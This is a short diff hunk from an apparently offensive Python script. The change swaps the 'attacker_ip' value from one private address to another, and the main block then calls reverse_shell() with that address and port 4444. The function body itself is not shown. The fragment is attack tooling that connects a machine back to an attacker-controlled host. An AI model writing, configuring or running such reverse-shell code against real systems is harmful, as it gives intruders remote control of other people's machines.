@@ -106,7 +106,7 @@ if __name__ == "__main__":
     print("Running the main part of the script...")
 
     # IP and port for the reverse shell
-    attacker_ip = '192.168.1.100'  # Replace with actual IP
+    attacker_ip = '10.211.55.24'  # Replace with actual IP
     attacker_port = 4444  # Port for the reverse shell
 
     reverse_shell(attacker_ip, attacker_port)
